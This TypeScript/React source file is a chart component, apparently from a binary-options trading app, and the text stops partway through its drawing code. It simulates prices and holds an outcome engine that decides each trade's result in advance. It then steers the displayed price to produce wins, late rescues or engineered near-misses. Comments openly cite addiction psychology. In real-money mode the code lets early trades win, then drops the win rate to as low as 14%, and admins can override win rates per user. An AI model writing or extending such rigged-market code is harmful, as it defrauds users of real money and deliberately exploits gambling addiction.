"use client";

import { useEffect, useRef, useCallback } from "react";

// ── Seeded PRNG ────────────────────────────────────────────────────────────────
function mulberry32(seed: number) {
  return () => {
    seed |= 0; seed = seed + 0x6d2b79f5 | 0;
    let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
    t = t + Math.imul(t ^ (t >>> 7), 61 | t) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}
function assetSeed(a: string) {
  return a.split("").reduce((s, c) => s + c.charCodeAt(0), 0) * 2654435761;
}

// ── Per-asset params ───────────────────────────────────────────────────────────
const VOL: Record<string, number> = {
  "BTC/USD": 0.00055, "ETH/USD": 0.00068,
  "EUR/USD": 0.000042, "GBP/USD": 0.000051, "SOL/USD": 0.00085,
};
const DEC: Record<string, number> = {
  "BTC/USD": 2, "ETH/USD": 2, "EUR/USD": 5, "GBP/USD": 5, "SOL/USD": 3,
};

// TICK_MS=500 ms → 2 price updates/sec (calm, slow movement).
// Line mode uses a 60-fps smoothstep live-point so it still feels fluid.
// Candle mode uses raw discrete ticks with no lerp → stable, crisp bars.
// BASE_MS kept at 700 for cycle-period formulas (same chart rhythm as original).
const TICK_MS = 500;
const BASE_MS = 700;
const dt      = TICK_MS / BASE_MS;          // ≈ 0.714
const DSCALE  = Math.sqrt(dt);              // ≈ 0.845 — Brownian (√dt) scaling
const MAX_BUF = 1600;
const HIST    = 800;                        // 400 s of seeded history — large pool so last 56 visible ticks look natural

// Visible ticks scaled so each timeframe covers the same wall-clock window
const VIS_TICKS: Record<string, number> = { "5s": 56, "30s": 112, "1m": 196, "5m": 364 };
// Candle groupings scaled for same candle duration as original
const TICKS_PER_CANDLE: Record<string, number> = { "5s": 1, "30s": 8, "1m": 15, "5m": 59 };

// ── Types ──────────────────────────────────────────────────────────────────────
export type Timeframe = "5s" | "30s" | "1m" | "5m";
export type ChartMode = "line" | "candle";
export type DrawTool  = "none" | "hline" | "trendline" | "eraser";

export interface TradeAnnotation {
  id: string; entryPrice: number; direction: "UP" | "DOWN";
  expiresAt: string; createdAt: string; amount: number; duration?: number;
}
interface OhlcData { open: number; high: number; low: number; close: number }
interface Tick { t: number; p: number }
interface HLine     { kind: "hline";     price: number }
interface TrendLine { kind: "trendline"; t1: number; p1: number; t2: number; p2: number }
type Drawing = HLine | TrendLine;

interface ChartView { lo: number; hi: number; wStart: number; wEnd: number; W: number; H: number }

interface Props {
  asset: string; initialPrice: number; trades: TradeAnnotation[];
  simEntryOverrides?: Map<string, number>;
  tradeMode?:          "demo" | "real";
  timeframe?:          Timeframe;
  chartMode?:          ChartMode;
  drawTool?:           DrawTool;
  clearTrigger?:       number;
  recentResults?:      boolean[];   // last N settled results (true=WIN) for current mode
  totalSettledTrades?: number;      // total settled trades in current mode (for real phase calc)
  winRateOverride?:   number | null;   // 0–100 admin override, null = use house defaults
  globalRealRate?:    number | null;   // admin global real win rate override
  globalDemoRate?:    number | null;   // admin global demo win rate override
  onPriceUpdate?:     (p: number) => void;
  onSettleTrade?:     (id: string, won: boolean, exitPrice: number) => void;
  onWinStatesChange?: (s: Record<string, boolean>) => void;
  onOhlcChange?:      (o: OhlcData | null) => void;
}

// ── Component ──────────────────────────────────────────────────────────────────
// ── Outcome engine ─────────────────────────────────────────────────────────────
// Returns the pre-determined fate of a trade given recent history and mode.
// This is the core of the addiction / house-edge psychology.
type Outcome = "win" | "close_win" | "near_miss" | "loss";

function tradeOutcome(
  tradeId: string,
  mode: "demo" | "real",
  recentResults: boolean[],
  totalSettled: number,
  winRateOverride?: number | null,
  globalRealRate?: number | null,
  globalDemoRate?: number | null
): Outcome {
  // Per-user admin override takes full precedence
  if (winRateOverride !== null && winRateOverride !== undefined) {
    const hash = tradeId.split("").reduce((s, c, i) => s + c.charCodeAt(0) * (i + 1), 0) % 100;
    if (hash < winRateOverride) return "win";
    if (hash < winRateOverride + 10) return "close_win";
    return "loss";
  }
  // Stable hash 0-99 from trade ID
  const hash = tradeId.split("").reduce((s, c, i) => s + c.charCodeAt(0) * (i + 1), 0) % 100;

  // Tail-loss / tail-win count
  let tailLoss = 0;
  for (let i = recentResults.length - 1; i >= 0 && !recentResults[i]; i--) tailLoss++;
  let tailWin = 0;
  for (let i = recentResults.length - 1; i >= 0 && recentResults[i]; i--) tailWin++;

  if (mode === "demo") {
    // Global demo rate override from admin settings
    if (globalDemoRate !== null && globalDemoRate !== undefined) {
      if (tailLoss >= 4 && globalDemoRate >= 30) return "win";
      if (hash < globalDemoRate) return "win";
      if (hash < globalDemoRate + 15) return "close_win";
      return "loss";
    }
    // ── Variable Ratio Reinforcement Schedule (most addictive pattern) ───────
    if (tailLoss >= 4) return "win";
    if (tailLoss >= 2) return "close_win";
    if (tailWin >= 4 && hash < 55) return "loss";
    if (tailWin >= 3 && hash < 30) return "loss";
    if (hash < 40) return "loss";
    if (hash < 60) return "close_win";
    return "win";
  } else {
    // Global real rate override from admin settings
    if (globalRealRate !== null && globalRealRate !== undefined) {
      if (totalSettled < 2) return "win";
      if (tailLoss >= 5) return "close_win";
      if (tailLoss >= 2 && hash % 3 === 0) return "near_miss";
      if (hash < globalRealRate) return "win";
      if (hash < globalRealRate + 15) return "near_miss";
      return "loss";
    }
    // ── House edge: player loses long-term, but stays hooked ─────────────────
    if (totalSettled < 2) return "win";
    if (totalSettled < 4) return "close_win";
    if (tailLoss >= 5) return "close_win";
    if (tailLoss >= 2 && hash % 3 === 0) return "near_miss";
    const winRate = totalSettled < 8  ? 42
                  : totalSettled < 20 ? 30
                  : totalSettled < 40 ? 20
                  :                     14;
    if (hash < winRate)       return "win";
    if (hash < winRate + 22)  return "near_miss";
    return "loss";
  }
}

export default function CustomChart({
  asset, initialPrice, trades, simEntryOverrides,
  tradeMode = "demo", timeframe = "5s", chartMode = "line", drawTool = "none",
  clearTrigger = 0, recentResults = [], totalSettledTrades = 0,
  winRateOverride, globalRealRate, globalDemoRate,
  onPriceUpdate, onSettleTrade, onWinStatesChange, onOhlcChange,
}: Props) {
  const canvasRef    = useRef<HTMLCanvasElement>(null);
  const bufRef       = useRef<Tick[]>([]);
  const curRef       = useRef(0);
  const prevPriceRef = useRef(0);   // price from BEFORE last tick — used for smoothstep line
  const tickStartRef = useRef(0);   // timestamp of last tick fire
  const settledRef   = useRef<Set<string>>(new Set());
  const entryMapRef  = useRef<Map<string, number>>(new Map());
  const rafRef       = useRef(0);
  const timerRef     = useRef<ReturnType<typeof setInterval> | undefined>(undefined);

  // Always-current prop refs
  const tradesRef    = useRef(trades);
  const overridesRef = useRef(simEntryOverrides);
  const onTickRef    = useRef(onPriceUpdate);
  const onSettleRef  = useRef(onSettleTrade);
  const onWinRef     = useRef(onWinStatesChange);
  const onOhlcRef    = useRef(onOhlcChange);
  const chartModeRef         = useRef(chartMode);
  const timeframeRef         = useRef(timeframe);
  const drawToolRef          = useRef(drawTool);
  const tradeModeRef         = useRef(tradeMode);
  const recentResultsRef     = useRef(recentResults);
  const totalSettledRef      = useRef(totalSettledTrades);
  const winRateOverrideRef   = useRef(winRateOverride);
  const globalRealRateRef    = useRef(globalRealRate);
  const globalDemoRateRef    = useRef(globalDemoRate);

  tradesRef.current          = trades;
  overridesRef.current       = simEntryOverrides;
  winRateOverrideRef.current = winRateOverride;
  globalRealRateRef.current  = globalRealRate;
  globalDemoRateRef.current  = globalDemoRate;
  onTickRef.current          = onPriceUpdate;
  onSettleRef.current        = onSettleTrade;
  onWinRef.current           = onWinStatesChange;
  onOhlcRef.current          = onOhlcChange;
  chartModeRef.current       = chartMode;
  timeframeRef.current       = timeframe;
  drawToolRef.current        = drawTool;
  tradeModeRef.current       = tradeMode;
  recentResultsRef.current   = recentResults;
  totalSettledRef.current    = totalSettledTrades;

  // Animated view — lerped every frame so Y-rescaling and X-scrolling are smooth
  const animViewRef = useRef({ lo: 0, hi: 0, wStart: 0, wEnd: 0, init: false });

  // Drawing state
  const drawingsRef      = useRef<Drawing[]>([]);
  const drawStartRef     = useRef<{ x: number; y: number } | null>(null);
  const previewRef       = useRef<{ x: number; y: number } | null>(null);
  const chartViewRef     = useRef<ChartView>({ lo: 0, hi: 0, wStart: 0, wEnd: 0, W: 0, H: 0 });
  const clearTriggerRef  = useRef(clearTrigger);

  // ── 1. Init history ────────────────────────────────────────────────────────
  useEffect(() => {
    if (initialPrice <= 0 || curRef.current > 0) return;
    const vol   = VOL[asset] ?? 0.001;
    const rand  = mulberry32(assetSeed(asset));
    const seed1 = assetSeed(asset) >>> 0;
    // Cycle periods fixed to BASE_MS so the rhythm is identical regardless of TICK_MS
    const cpd1  = ((seed1 % 25) + 18) * BASE_MS;
    const cpd2  = cpd1 * 1.75;
    const cOff  = ((seed1 % 100) / 100) * Math.PI * 2;
    const now   = Date.now();
    // Generate history FORWARD in time so the visible window shows a natural
    // random walk — NOT an artificial S-curve converging on initialPrice.
    let p = initialPrice;
    const ticks: Tick[] = [];
    for (let i = 0; i < HIST; i++) {
      const t   = now - (HIST - i) * TICK_MS;
      const mr  = (initialPrice - p) * 0.18 * dt;            // strong mean-reversion keeps history near initialPrice
      const cyc = p * vol * 0.30 * (
        Math.sin(t / cpd1 * Math.PI * 2 + cOff) * 0.6 +
        Math.sin(t / cpd2 * Math.PI * 2) * 0.3
      ) * dt;
      p = p + (rand() - 0.5) * vol * 0.55 * initialPrice * DSCALE + cyc + mr;
      p = Math.max(Math.min(p, initialPrice * 1.05), initialPrice * 0.95);
      ticks.push({ t, p });
    }
    bufRef.current       = ticks;
    curRef.current       = ticks[ticks.length - 1].p;
    prevPriceRef.current = ticks[ticks.length - 1].p;
    tickStartRef.current = ticks[ticks.length - 1].t;
    settledRef.current.clear();
    entryMapRef.current.clear();
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [initialPrice]);

  // ── 1b. Clear drawings when trigger fires ──────────────────────────────────
  useEffect(() => {
    if (clearTrigger !== clearTriggerRef.current) {
      clearTriggerRef.current = clearTrigger;
      drawingsRef.current = [];
    }
  }, [clearTrigger]);

  // ── 2. Live tick loop ──────────────────────────────────────────────────────
  useEffect(() => {
    if (initialPrice <= 0) return;
    const vol   = VOL[asset] ?? 0.001;
    // Asset-unique cycle constants (same formula as history so chart feels continuous)
    const seed1 = assetSeed(asset) >>> 0;
    const cpd1  = ((seed1 % 25) + 18) * BASE_MS;  // fixed rhythm — same as history
    const cpd2  = cpd1 * 1.75;
    const cOff  = ((seed1 % 100) / 100) * Math.PI * 2;

    // When returning to the tab, restart the interval to flush any
    // backed-up throttled callbacks that would otherwise fire in rapid
    // succession and produce a flat line on the chart.
    function handleVisibility() {
      if (document.visibilityState !== "visible") return;
      if (timerRef.current) clearInterval(timerRef.current);
      timerRef.current = setInterval(tick, TICK_MS);
    }
    document.addEventListener("visibilitychange", handleVisibility);

    function tick() {
      const prev  = curRef.current || initialPrice;
      const nowMs = Date.now();
      const mr    = (initialPrice - prev) * 0.006 * dt;  // mean-reversion scales linearly
      // Cyclic drift — scales linearly with dt; periods use BASE_MS for consistent rhythm
      const cycle = prev * vol * 0.28 * (
        Math.sin(nowMs / cpd1 * Math.PI * 2 + cOff) * 0.6 +
        Math.sin(nowMs / cpd2 * Math.PI * 2) * 0.3
      ) * dt;

      // ── Outcome-driven price manipulation (only on the most-recent trade) ───
      let manipulation = 0;
      if (tradesRef.current.length > 0) {
        const pending = tradesRef.current.filter(t => new Date(t.expiresAt).getTime() > nowMs);
        if (pending.length > 0) {
          // Only the most recently placed trade drives the chart — stacking is obvious
          const trade = pending.reduce((latest, t) =>
            new Date(t.createdAt).getTime() > new Date(latest.createdAt).getTime() ? t : latest
          );
          const entry = overridesRef.current?.get(trade.id) ?? entryMapRef.current.get(trade.id);
          if (entry) {
            const createdMs  = new Date(trade.createdAt).getTime();
            const expMs      = new Date(trade.expiresAt).getTime();
            const totalDur   = Math.max(1, expMs - createdMs);
            const pctElapsed = Math.min(1, (nowMs - createdMs) / totalDur);
            const pctLeft    = 1 - pctElapsed;
            const dir        = trade.direction === "UP" ? 1 : -1;
            const isWinning  = trade.direction === "UP" ? prev > entry : prev < entry;

            const outcome = tradeOutcome(
              trade.id,
              tradeModeRef.current,
              recentResultsRef.current,
              totalSettledRef.current,
              winRateOverrideRef.current,
              globalRealRateRef.current,
              globalDemoRateRef.current
            );

            // Smooth ramp helper
            const ramp = (from: number, to: number) =>
              pctElapsed > from ? Math.min(1, (pctElapsed - from) / Math.max(0.01, to - from)) : 0;

            if (outcome === "win") {
              if (!isWinning) manipulation += vol * 1.8 * dir * ramp(0.35, 0.75);
              else            manipulation += vol * 0.18 * dir; // hold position
              if (pctLeft < 0.15 && !isWinning) manipulation += vol * 4.2 * dir;

            } else if (outcome === "close_win") {
              // Let it drift, even pull back to create drama, rescue late
              if (isWinning && pctLeft > 0.18) manipulation -= vol * 0.1 * dir;
              if (pctLeft < 0.22 && !isWinning) manipulation += vol * 2.8 * dir * (1 - pctLeft / 0.22);
              if (pctLeft < 0.07) manipulation += vol * 5.5 * dir;

            } else if (outcome === "near_miss") {
              // Push toward winning in middle → pull back before expiry
              // Creates "I almost won!" — most addictive gambling pattern
              if (pctElapsed < 0.55) manipulation += vol * 0.5 * dir; // early hope
              if (pctElapsed > 0.55) manipulation -= vol * 0.6 * dir; // pull back
              if (pctLeft < 0.12)    manipulation -= vol * 1.8 * dir; // ensure loss

            }
            // "loss": zero manipulation — pure market noise → loses naturally
          }
        }
      }

      // Brownian step scales with √dt; manipulation is a drift force → scales linearly
      const delta = (Math.random() - 0.5) * vol * 0.55 * prev * DSCALE;
      const next  = Math.max(prev * 0.98, prev + delta + cycle + mr + manipulation * prev * dt);
      prevPriceRef.current = curRef.current || next; // save for smoothstep interpolation
      tickStartRef.current = nowMs;
      curRef.current = next;

      bufRef.current.push({ t: nowMs, p: next });
      if (bufRef.current.length > MAX_BUF) bufRef.current.shift();
      onTickRef.current?.(next);

      // Win states + settlements
      const winStates: Record<string, boolean> = {};
      for (const trade of tradesRef.current) {
        let entry = overridesRef.current?.get(trade.id) ?? entryMapRef.current.get(trade.id);
        if (entry === undefined) { entry = next; entryMapRef.current.set(trade.id, next); }
        const isWin = trade.direction === "UP" ? next > entry : next < entry;
        winStates[trade.id] = isWin;
        const expMs = new Date(trade.expiresAt).getTime();
        if (nowMs >= expMs && !settledRef.current.has(trade.id)) {
          settledRef.current.add(trade.id);
          onSettleRef.current?.(trade.id, isWin, next);
        }
      }
      onWinRef.current?.(winStates);

      // OHLC — same ~42 s window as before (60 × BASE_MS / TICK_MS ticks)
      const sl = bufRef.current.slice(-Math.round(60 * BASE_MS / TICK_MS));
      if (sl.length > 1) {
        const pp = sl.map(t => t.p);
        onOhlcRef.current?.({ open: pp[0], high: Math.max(...pp), low: Math.min(...pp), close: pp[pp.length - 1] });
      }
    }

    timerRef.current = setInterval(tick, TICK_MS);

    return () => {
      if (timerRef.current) clearInterval(timerRef.current);
      document.removeEventListener("visibilitychange", handleVisibility);
    };
  // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [asset, initialPrice]);

  // ── 3. Cleanup settled trades ──────────────────────────────────────────────
  useEffect(() => {
    const ids = new Set(trades.map(t => t.id));
    for (const id of [...settledRef.current])
      if (!ids.has(id)) { settledRef.current.delete(id); entryMapRef.current.delete(id); }
  }, [trades]);

  // ── 4. Drawing tool mouse handlers ────────────────────────────────────────
  const pxToChart = useCallback((px: number, py: number) => {
    const v = chartViewRef.current;
    if (!v.W || !v.H) return { t: 0, price: 0 };
    const price = v.lo + (v.hi - v.lo) * (1 - py / v.H);
    const t     = v.wStart + (px / v.W) * (v.wEnd - v.wStart);
    return { t, price };
  }, []);

  const handleMouseDown = useCallback((e: MouseEvent) => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    const rect = canvas.getBoundingClientRect();
    const px   = e.clientX - rect.left;
    const py   = e.clientY - rect.top;
    const tool = drawToolRef.current;

    if (tool === "eraser") {
      const v = chartViewRef.current;
      const toX = (ms: number) => (ms - v.wStart) / (v.wEnd - v.wStart) * v.W;
      const toY = (p: number)  => v.H - (p - v.lo) / (v.hi - v.lo) * v.H;
      let closestIdx = -1, closestDist = 20;
      drawingsRef.current.forEach((d, i) => {
        if (d.kind === "hline") {
          const dist = Math.abs(toY(d.price) - py);
          if (dist < closestDist) { closestDist = dist; closestIdx = i; }
        } else {
          const mx = (toX(d.t1) + toX(d.t2)) / 2;
          const my = (toY(d.p1) + toY(d.p2)) / 2;
          const dist = Math.hypot(mx - px, my - py);
          if (dist < closestDist) { closestDist = dist; closestIdx = i; }
        }
      });
      if (closestIdx >= 0) drawingsRef.current.splice(closestIdx, 1);
      return;
    }

    if (tool === "hline") {
      const { price } = pxToChart(px, py);
      drawingsRef.current.push({ kind: "hline", price });
      return;
    }

    if (tool === "trendline") {
      drawStartRef.current = { x: px, y: py };
      previewRef.current   = { x: px, y: py };
    }
  }, [pxToChart]);

  const handleMouseMove = useCallback((e: MouseEvent) => {
    if (drawToolRef.current !== "trendline" || !drawStartRef.current) return;
    const canvas = canvasRef.current;
    if (!canvas) return;
    const rect = canvas.getBoundingClientRect();
    previewRef.current = { x: e.clientX - rect.left, y: e.clientY - rect.top };
  }, []);

  const handleMouseUp = useCallback((e: MouseEvent) => {
    if (drawToolRef.current !== "trendline" || !drawStartRef.current) return;
    const canvas = canvasRef.current;
    if (!canvas) return;
    const rect = canvas.getBoundingClientRect();
    const ex = e.clientX - rect.left;
    const ey = e.clientY - rect.top;
    if (Math.hypot(ex - drawStartRef.current.x, ey - drawStartRef.current.y) > 5) {
      const p1 = pxToChart(drawStartRef.current.x, drawStartRef.current.y);
      const p2 = pxToChart(ex, ey);
      drawingsRef.current.push({ kind: "trendline", t1: p1.t, p1: p1.price, t2: p2.t, p2: p2.price });
    }
    drawStartRef.current = null;
    previewRef.current   = null;
  }, [pxToChart]);

  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;
    if (drawTool === "none") { canvas.style.cursor = "default"; return; }
    canvas.style.cursor = drawTool === "eraser" ? "cell" : "crosshair";
    canvas.addEventListener("mousedown", handleMouseDown);
    canvas.addEventListener("mousemove", handleMouseMove);
    canvas.addEventListener("mouseup",   handleMouseUp);
    return () => {
      canvas.style.cursor = "default";
      canvas.removeEventListener("mousedown", handleMouseDown);
      canvas.removeEventListener("mousemove", handleMouseMove);
      canvas.removeEventListener("mouseup",   handleMouseUp);
    };
  }, [drawTool, handleMouseDown, handleMouseMove, handleMouseUp]);

  // ── 5. RAF draw loop ───────────────────────────────────────────────────────
  useEffect(() => {
    const canvas = canvasRef.current;
    if (!canvas) return;

    // Reset animated view so a new asset starts without lerping from stale values
    animViewRef.current = { lo: 0, hi: 0, wStart: 0, wEnd: 0, init: false };

    function draw() {
      const ctx = canvas!.getContext("2d");
      if (!ctx) { rafRef.current = requestAnimationFrame(draw); return; }

      const W   = canvas!.width;
      const H   = canvas!.height;
      const buf = bufRef.current;
      const dec = DEC[asset] ?? 2;
      const tf  = timeframeRef.current;
      const cm  = chartModeRef.current;

      // Background
      ctx.fillStyle = "#060c18";
      ctx.fillRect(0, 0, W, H);

      if (buf.length < 2) { rafRef.current = requestAnimationFrame(draw); return; }

      // Visible slice
      const visTicks = VIS_TICKS[tf] ?? 60;
      const vis      = buf.slice(-visTicks);
      const VIS      = vis.length;

      const now = Date.now();

      // Right-side padding: extend to show nearest expiry.
      // Use BASE_MS (absolute ms) so padding is the same real-time duration
      // regardless of how often ticks fire.
      let rightPadMs = BASE_MS * 18;
      for (const trade of tradesRef.current) {
        const rem = new Date(trade.expiresAt).getTime() - now;
        if (rem > 0) rightPadMs = Math.max(rightPadMs, Math.min(rem + BASE_MS * 6, TICK_MS * visTicks * 0.7));
      }

      // ── Live interpolated price — computed here so it feeds the bounds ────
      // (also used later for the dot, reference line, and price tag)
      const lastP  = vis[VIS - 1].p;
      const firstP = vis[0].p;
      const _elapsed = Math.min(TICK_MS, now - (tickStartRef.current || now));
      const _tFrac   = _elapsed / TICK_MS;
      const _smooth  = _tFrac * _tFrac * (3 - 2 * _tFrac);
      const _fromP   = prevPriceRef.current || lastP;
      const _toP     = curRef.current       || lastP;
      const livePrice = _fromP + (_toP - _fromP) * _smooth;

      // ── Compute target view window ─────────────────────────────────────
      // Include livePrice so the dot never escapes the Y range — which would
      // create a visible jerk when the bounds snap to catch up.
      const allPrices = [...vis.map(t => t.p), livePrice];
      const minP = Math.min(...allPrices);
      const maxP = Math.max(...allPrices);
      const rng  = maxP - minP || minP * 0.005;
      const pad  = rng * 0.22;
      const tLo     = minP - pad;
      const tHi     = maxP + pad;
      const tWStart = vis[0].t;
      const tWEnd   = vis[VIS - 1].t + rightPadMs;

      // ── Lerp the view so Y-rescaling and X-scrolling are animated ──────
      // X tracks fast (scrolling should feel live); Y tracks slower (scale
      // changes feel dramatic/jumpy if instant).
      const av        = animViewRef.current;
      const lp        = (a: number, b: number, k: number) => a + (b - a) * k;
      const isCandles = cm === "candle";
      if (!av.init) {
        av.lo = tLo; av.hi = tHi; av.wStart = tWStart; av.wEnd = tWEnd; av.init = true;
      } else if (isCandles) {
        // Candle mode: X snaps (bars must stay fixed horizontally);
        // Y uses a fast lerp (settles in <3 frames, looks instant) to avoid
        // a hard jump when a new price extreme enters the visible window.
        av.wStart = tWStart; av.wEnd = tWEnd;
        av.lo = lp(av.lo, tLo, 0.18);
        av.hi = lp(av.hi, tHi, 0.18);
      } else {
        // Line mode: smooth X scroll + gentle Y breathing
        av.wStart = lp(av.wStart, tWStart, 0.08);
        av.wEnd   = lp(av.wEnd,   tWEnd,   0.08);
        av.lo     = lp(av.lo,     tLo,     0.06);
        av.hi     = lp(av.hi,     tHi,     0.06);
      }

      const lo     = av.lo;
      const hi     = av.hi;
      const wStart = av.wStart;
      const wEnd   = av.wEnd;
      const wDur   = wEnd - wStart;

      const toX = (ms: number) => ((ms - wStart) / wDur) * W;
      const toY = (p: number)  => H - ((p - lo) / (hi - lo)) * H;

      // Store animated chart view for mouse-to-price conversion
      chartViewRef.current = { lo, hi, wStart, wEnd, W, H };

      // ── Grid ────────────────────────────────────────────────────────────
      ctx.strokeStyle = "rgba(255,255,255,0.025)";
      ctx.lineWidth   = 1;
      for (let i = 1; i <= 4; i++) {
        const y = (i / 5) * H;
        ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(W, y); ctx.stroke();
      }
      for (let i = 1; i <= 6; i++) {
        const x = (i / 7) * W;
        ctx.beginPath(); ctx.moveTo(x, 0); ctx.lineTo(x, H); ctx.stroke();
      }

      // Price labels
      ctx.font = "9px monospace"; ctx.fillStyle = "rgba(255,255,255,0.15)"; ctx.textAlign = "right";
      for (let i = 0; i <= 4; i++) {
        const price = lo + (hi - lo) * (1 - i / 4);
        ctx.fillText(price.toFixed(dec), W - 6, (i / 4) * H + 4);
      }
      ctx.textAlign = "left";

      // ── Drawings ─────────────────────────────────────────────────────────
      ctx.strokeStyle = "rgba(251,191,36,0.7)"; ctx.lineWidth = 1.5; ctx.setLineDash([6, 5]);
      for (const d of drawingsRef.current) {
        if (d.kind === "hline") {
          const y = toY(d.price);
          ctx.beginPath(); ctx.moveTo(0, y); ctx.lineTo(W, y); ctx.stroke();
          ctx.setLineDash([]);
          ctx.fillStyle = "rgba(251,191,36,0.8)"; ctx.font = "bold 9px monospace";
          ctx.fillText(d.price.toFixed(dec), 4, y - 3);
          ctx.setLineDash([6, 5]);
        } else {
          ctx.beginPath();
          ctx.moveTo(toX(d.t1), toY(d.p1));
          ctx.lineTo(toX(d.t2), toY(d.p2));
          ctx.stroke();
        }
      }
      // Trendline preview
      if (drawStartRef.current && previewRef.current) {
        ctx.strokeStyle = "rgba(251,191,36,0.5)";
        ctx.beginPath();
        ctx.moveTo(drawStartRef.current.x, drawStartRef.current.y);
        ctx.lineTo(previewRef.current.x, previewRef.current.y);
        ctx.stroke();
      }
      ctx.setLineDash([]);

      // ── Trade annotations ─────────────────────────────────────────────────
      const pulse  = (Date.now() % 1800) / 1800; // 0→1 cycle every 1.8 s
      const pulse2 = (pulse + 0.5) % 1;

      for (const trade of tradesRef.current) {
        const entry = overridesRef.current?.get(trade.id) ?? entryMapRef.current.get(trade.id);
        if (entry === undefined) continue;
        const cur    = curRef.current;
        const isUp   = trade.direction === "UP";
        const isWin  = isUp ? cur > entry : cur < entry;
        const rgb    = isWin ? "16,185,129" : "239,68,68";
        const solid  = `rgba(${rgb},`;

        const yE   = toY(entry);
        const yCur = toY(cur);

        // ── P&L fill zone ─────────────────────────────────────────────────
        const zTop = Math.min(yE, yCur), zBot = Math.max(yE, yCur);
        if (zBot - zTop > 1) {
          const zg = ctx.createLinearGradient(0, zTop, 0, zBot);
          if (isWin) {
            zg.addColorStop(0, "rgba(16,185,129,0.22)");
            zg.addColorStop(1, "rgba(16,185,129,0.05)");
          } else {
            zg.addColorStop(0, "rgba(239,68,68,0.05)");
            zg.addColorStop(1, "rgba(239,68,68,0.22)");
          }
          ctx.fillStyle = zg;
          ctx.fillRect(0, zTop, W, zBot - zTop);
        }

        // ── Horizontal entry line ──────────────────────────────────────────
        ctx.strokeStyle = `${solid}0.8)`; ctx.lineWidth = 1.5; ctx.setLineDash([8, 5]);
        ctx.beginPath(); ctx.moveTo(0, yE); ctx.lineTo(W, yE); ctx.stroke();
        ctx.setLineDash([]);

        // ── Entry vertical line + assertive marker ────────────────────────
        const createdMs = new Date(trade.createdAt).getTime();
        const xCr       = toX(createdMs);
        const dotOnScreen = xCr >= -2 && xCr <= W + 2;

        if (dotOnScreen) {
          // Thin solid vertical line
          ctx.strokeStyle = `${solid}0.25)`; ctx.lineWidth = 1; ctx.setLineDash([]);
          ctx.beginPath(); ctx.moveTo(xCr, 0); ctx.lineTo(xCr, H); ctx.stroke();

          // Subtle radial glow
          const glow = ctx.createRadialGradient(xCr, yE, 0, xCr, yE, 18);
          glow.addColorStop(0, `rgba(${rgb},0.18)`);
          glow.addColorStop(1, `rgba(${rgb},0)`);
          ctx.fillStyle = glow;
          ctx.beginPath(); ctx.arc(xCr, yE, 18, 0, Math.PI * 2); ctx.fill();

          // Single soft pulse ring
          ctx.strokeStyle = `rgba(${rgb},${(1 - pulse) * 0.35})`; ctx.lineWidth = 1;
          ctx.beginPath(); ctx.arc(xCr, yE, 8 + pulse * 10, 0, Math.PI * 2); ctx.stroke();

          // Main solid disc — smaller and cleaner
          ctx.fillStyle = `${solid}1)`;
          ctx.beginPath(); ctx.arc(xCr, yE, 7, 0, Math.PI * 2); ctx.fill();

          // Thin white border
          ctx.strokeStyle = "rgba(255,255,255,0.55)"; ctx.lineWidth = 1.2;
          ctx.beginPath(); ctx.arc(xCr, yE, 7, 0, Math.PI * 2); ctx.stroke();

          // Direction arrow
          ctx.font = "bold 8px system-ui, sans-serif";
          ctx.fillStyle = "#fff"; ctx.textAlign = "center";
          ctx.fillText(isUp ? "▲" : "▼", xCr, yE + 3);
          ctx.textAlign = "left";

          // ── Floating "COMPRA / VENDA" flag label ────────────────────────
          const label    = isUp ? "COMPRA" : "VENDA";
          const priceStr = entry.toFixed(dec);
          ctx.font = "bold 9px monospace";
          const flagW = ctx.measureText(`${label}  ${priceStr}`).width + 14;
          const flagH = 18;
          // Try right of dot first, flip left if it would overflow
          const flagX = xCr + 12 + flagW < W ? xCr + 12 : xCr - 12 - flagW;
          const flagY = yE - flagH / 2;

          // Flag pill
          ctx.fillStyle = `${solid}0.88)`;
          if (ctx.roundRect) ctx.roundRect(flagX, flagY, flagW, flagH, 4);
          else ctx.rect(flagX, flagY, flagW, flagH);
          ctx.fill();

          // Connecting line from disc edge to flag
          const lineEndX = xCr + 12 + flagW < W ? xCr + 8 : xCr - 8;
          ctx.strokeStyle = `${solid}0.6)`; ctx.lineWidth = 1;
          ctx.beginPath(); ctx.moveTo(lineEndX, yE); ctx.lineTo(flagX + (xCr + 16 + flagW < W ? 0 : flagW), yE); ctx.stroke();

          // Flag text — label on left, price on right
          ctx.fillStyle = "#fff"; ctx.textAlign = "left";
          ctx.font = "bold 10px monospace";
          ctx.fillText(label, flagX + 6, yE + 3.5);
          ctx.textAlign = "right";
          ctx.font = "9px monospace";
          ctx.fillStyle = "rgba(255,255,255,0.75)";
          ctx.fillText(priceStr, flagX + flagW - 5, yE + 3.5);
          ctx.textAlign = "left";
        }

        // ── Right-edge price badge ─────────────────────────────────────────
        const arrow = isUp ? "▲" : "▼";
        const pnlPct = ((cur - entry) / entry * 100 * (isUp ? 1 : -1)).toFixed(2);
        const badge1 = `${arrow} ${entry.toFixed(dec)}`;
        const badge2 = `${isWin ? "+" : ""}${pnlPct}%`;
        ctx.font = "bold 11px monospace";
        const b1w = ctx.measureText(badge1).width;
        ctx.font = "10px monospace";
        const b2w = ctx.measureText(badge2).width;
        const bw  = Math.max(b1w, b2w) + 20;
        const bh  = 32;
        const bx  = W - bw - 4;
        const by  = Math.max(4, Math.min(yE - bh / 2, H - bh - 4));

        ctx.fillStyle = `${solid}0.92)`;
        if (ctx.roundRect) ctx.roundRect(bx, by, bw, bh, 5);
        else ctx.rect(bx, by, bw, bh);
        ctx.fill();

        ctx.fillStyle = "#fff"; ctx.textAlign = "center";
        ctx.font = "bold 11px monospace";
        ctx.fillText(badge1, bx + bw / 2, by + 13);
        ctx.font = "bold 10px monospace";
        ctx.fillStyle = isWin ? "#86efac" : "#fca5a5";
        ctx.fillText(badge2, bx + bw / 2, by + 26);
        ctx.textAlign = "left";

        // ── Expiry vertical line + countdown ─────────────────────────────
        const exMs = new Date(trade.expiresAt).getTime();
        const xEx  = toX(exMs);
        if (xEx >= 0 && xEx <= W) {
          ctx.strokeStyle = `${solid}0.7)`; ctx.lineWidth = 2; ctx.setLineDash([5, 4]);
